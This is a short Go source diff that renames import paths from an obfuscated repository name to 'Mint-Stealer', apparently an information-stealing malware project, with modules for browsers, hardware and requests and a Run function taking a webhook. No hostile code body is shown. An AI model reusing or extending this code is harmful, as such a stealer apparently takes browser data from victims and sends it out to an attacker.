@@ -5,10 +5,10 @@ import (
 	"os"
 	"strings"
 
-	"github.com/0xFl4q/1237FHJQSDF1234/modules/browsers"
-	"github.com/0xFl4q/1237FHJQSDF1234/utils/fileutil"
-	"github.com/0xFl4q/1237FHJQSDF1234/utils/hardware"
-	"github.com/0xFl4q/1237FHJQSDF1234/utils/requests"
+	"github.com/0xFl4q/Mint-Stealer/modules/browsers"
+	"github.com/0xFl4q/Mint-Stealer/utils/fileutil"
+	"github.com/0xFl4q/Mint-Stealer/utils/hardware"
+	"github.com/0xFl4q/Mint-Stealer/utils/requests"
 )
 
 func Run(webhook string) {
